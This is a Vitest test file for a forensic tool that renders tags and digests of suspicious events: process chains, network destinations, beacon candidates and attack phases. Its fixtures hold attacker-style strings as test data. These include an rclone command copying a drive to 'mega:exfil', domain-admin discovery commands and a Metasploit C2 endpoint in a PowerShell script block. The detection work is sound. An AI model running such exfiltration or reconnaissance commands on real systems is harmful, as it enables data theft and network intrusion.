import { describe, it, expect } from "vitest";
import {
  renderStructuredTags,
  buildBeaconDigest,
  buildAttackPhaseDigest,
} from "../../src/analysis/synthEvidence.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";
import type { BeaconCandidate } from "../../src/analysis/beaconDetect.js";
import type { AttackPhase } from "../../src/analysis/burstDetect.js";

function ev(p: Partial<ForensicEvent>): ForensicEvent {
  return {
    id: p.id ?? "e1",
    timestamp: p.timestamp ?? "2026-01-01T00:00:00Z",
    description: p.description ?? "x",
    severity: p.severity ?? "Info",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    ...p,
  };
}

describe("renderStructuredTags", () => {
  it("emits host/proc/net/src tags only for set fields", () => {
    const t = renderStructuredTags(
      ev({
        asset: "WS07",
        processName: "powershell.exe",
        parentName: "excel.exe",
        srcIp: "10.1.2.3",
        dstIp: "52.1.1.1",
        port: 443,
        sources: ["a", "b", "c"],
      }),
    );
    expect(t).toContain("<host:WS07>");
    expect(t).toContain("<proc:powershell.exe←excel.exe>");
    expect(t).toContain("<net:10.1.2.3→52.1.1.1:443>");
    expect(t).toContain("<src:3>");
  });

  it("returns '' for a bare event (no structured fields)", () => {
    expect(renderStructuredTags(ev({ description: "just prose" }))).toBe("");
  });

  it("omits <src:N> when fewer than 2 sources (no corroboration to flag)", () => {
    expect(renderStructuredTags(ev({ sources: ["only-one"] }))).toBe("");
  });

  it("carries a script block's discovery commands as tags the 240-char render cannot cut (#1531)", () => {
    const t = renderStructuredTags(
      ev({
        asset: "ws07.example.com",
        description: "DetectRaptor Evtx detection: Suspicious Powershell Commandlets (EID 4104)",
        message:
          "Creating Scriptblock text (1 of 1):\nforeach($cmd in @('nltest /dclist:LAB.INVALID','Get-ADGroupMember \"Domain Admins\"')){ }",
      }),
    );
    expect(t).toContain("<script-commands:");
    expect(t).toContain("Get-ADGroupMember");
    expect(t).toContain("<script-techniques:");
    expect(t).toContain("T1069.002");
  });

  it("emits no script tags for a row the case's own collector produced (#1500)", () => {
    const t = renderStructuredTags(
      ev({
        origin: "collector",
        description: "Sigma: Potential WinAPI Calls Via PowerShell (EID 4104)",
        message:
          "Creating Scriptblock text (1 of 1):\nGet-Process; Invoke-Command -ComputerName dc01.example.com { }",
      }),
    );
    expect(t).toBe("");
  });

  it("handles a process with no parent and a dst-only connection", () => {
    const t = renderStructuredTags(ev({ processName: "cmd.exe", dstIp: "8.8.8.8" }));
    expect(t).toContain("<proc:cmd.exe>");
    expect(t).not.toContain("←");
    expect(t).toContain("<net:?→8.8.8.8>");
  });
});

function beacon(p: Partial<BeaconCandidate>): BeaconCandidate {
  return {
    id: p.id ?? "beacon-1",
    source: p.source ?? "WS04",
    destIp: p.destIp ?? "203.0.113.7",
    destPort: p.destPort,
    eventCount: p.eventCount ?? 214,
    intervalSeconds: p.intervalSeconds ?? 62,
    jitterSeconds: p.jitterSeconds ?? 1,
    jitterPct: p.jitterPct ?? 3,
    firstSeen: "",
    lastSeen: "",
    severity: p.severity ?? "High",
    external: p.external ?? true,
    eventIds: p.eventIds ?? ["e1", "e2"],
  };
}

describe("buildBeaconDigest", () => {
  it("renders a candidate line with the verify caveat", () => {
    const out = buildBeaconDigest([beacon({ destPort: 443 })]);
    expect(out).toContain("PERIODIC BEACON CANDIDATES");
    expect(out).toContain("WS04 → 203.0.113.7:443 every ~62s");
    expect(out).toMatch(/LEAD to verify/i);
    expect(out).toMatch(/not a verdict|not confirmed C2/i);
  });

  it("returns '' when there are no beacons", () => {
    expect(buildBeaconDigest([])).toBe("");
  });
});

function phase(p: Partial<AttackPhase>): AttackPhase {
  return {
    id: p.id ?? "phase-1",
    label: p.label ?? "Discovery",
    startTimestamp: p.startTimestamp ?? "2026-05-20T09:02:00Z",
    endTimestamp: p.endTimestamp ?? "2026-05-20T09:15:00Z",
    eventIds: p.eventIds ?? ["e1", "e2"],
    inferredTechniques: p.inferredTechniques ?? ["T1087"],
    eventCount: p.eventCount ?? 41,
    maxSeverity: p.maxSeverity ?? "Medium",
  };
}

describe("buildAttackPhaseDigest", () => {
  it("renders a phase line with window, label, count and techniques", () => {
    const out = buildAttackPhaseDigest([phase({})]);
    expect(out).toContain("ATTACK PHASES");
    expect(out).toContain("09:02–09:15 Discovery (41 ev, Medium)");
    expect(out).toContain("T1087");
  });

  it("skips single-event phases and empty input", () => {
    expect(buildAttackPhaseDigest([phase({ eventCount: 1 })])).toBe("");
    expect(buildAttackPhaseDigest([])).toBe("");
  });
});

describe("renderStructuredTags — destination facts and the renamed-binary flag (#1502)", () => {
  it("appends the rclone destination and the decoy flag after the existing tags", () => {
    const t = renderStructuredTags(
      ev({
        asset: "WS01",
        processName: "rclone.exe",
        parentName: "powershell.exe",
        commandLine: '"C:\\T\\rclone.exe" /c echo X rclone.exe copy X:\\ mega:exfil --config rclone.conf',
        description: "Sysmon EID 1 rclone.exe [renamed binary: rclone.exe is really Cmd.Exe]",
      }),
    );
    expect(t).toContain("<proc:rclone.exe←powershell.exe>");
    expect(t).toContain("<dest:mega:exfil>");
    expect(t).toContain("<renamed-binary:rclone.exe is really Cmd.Exe — ");
    expect(t.indexOf("<proc:")).toBeLessThan(t.indexOf("<dest:"));
  });

  it("puts a script block's endpoint on the row even though the description never held it", () => {
    const t = renderStructuredTags(
      ev({
        description: "EID 4104 ScriptBlockText=function Invoke-Sim {",
        message: "function Invoke-Sim { Invoke-LoopbackPort 4321 '203.0.113.22:4321 Metasploit C2' }",
      }),
    );
    expect(t).toBe(" <mentions-endpoint:203.0.113.22:4321 (labelled c2)>");
  });

  it("adds nothing to a bare row", () => {
    expect(renderStructuredTags(ev({ description: "Logon 4624" }))).toBe("");
  });
});

// #1530 — a Sysmon EID 3 row sets no processName and no dstIp/port, so the model saw neither the
// image nor the destination: both live in the canonical envelope, and the 240-character
// description render cuts `DestinationIp=…` out of the middle of the prose.
describe("renderStructuredTags — canonical fallback for network rows", () => {
  const netEvent = (extra: Partial<ForensicEvent> = {}): ForensicEvent =>
    ev({
      asset: "DESKTOP-16OJFO6",
      description: "Velociraptor Sigma: Net Conn (Sysmon Alert) - Sysmon Network connection (EID 3)",
      canonical: {
        schemaVersion: "1.0.0",
        event: { category: "network", type: "connection" },
        network: {
          source: { address: "192.168.195.133" },
          destination: { address: "150.171.109.82", port: 443 },
        },
        file: {
          path: "C:\\Users\\v\\AppData\\Local\\Microsoft\\OneDrive\\StandaloneUpdater\\OneDriveSetup.exe",
          name: "OneDriveSetup.exe",
        },
        time: { observed: "2026-08-30 15:02:40", normalized: "2026-08-30T15:02:40.005Z" },
      },
      ...extra,
    } as Partial<ForensicEvent>);

  it("names the image and the destination the prose render cuts out", () => {
    const t = renderStructuredTags(netEvent());
    expect(t).toContain("<proc:OneDriveSetup.exe>");
    expect(t).toContain("<net:192.168.195.133→150.171.109.82:443>");
  });

  it("falls back to the path's base name when the envelope carries no file name", () => {
    const e = netEvent();
    delete (e.canonical!.file as { name?: string }).name;
    expect(renderStructuredTags(e)).toContain("<proc:OneDriveSetup.exe>");
  });

  it("keeps the flat fields in front of the envelope", () => {
    const t = renderStructuredTags(
      netEvent({ processName: "rundll32.exe", dstIp: "203.0.113.9", port: 8443 }),
    );
    expect(t).toContain("<proc:rundll32.exe>");
    expect(t).toContain("<net:192.168.195.133→203.0.113.9:8443>");
  });

  it("adds nothing for an event with neither flat fields nor an envelope", () => {
    expect(renderStructuredTags(ev({ description: "x" }))).toBe("");
  });
});

// The image fallback must not read a file row's TARGET file as the process that ran (#1530).
describe("renderStructuredTags — the canonical image fallback is network-only", () => {
  it("does not call a written file a process", () => {
    const t = renderStructuredTags(
      ev({
        description: "file created",
        canonical: {
          schemaVersion: "1.0.0",
          event: { category: "file", type: "create" },
          file: { path: "C:\\Users\\a\\Desktop\\invoice.xlsm", name: "invoice.xlsm" },
          time: { observed: "2026-05-02 10:00:00", normalized: "2026-05-02T10:00:00Z" },
        },
      } as Partial<ForensicEvent>),
    );
    expect(t).not.toContain("<proc:");
  });
});
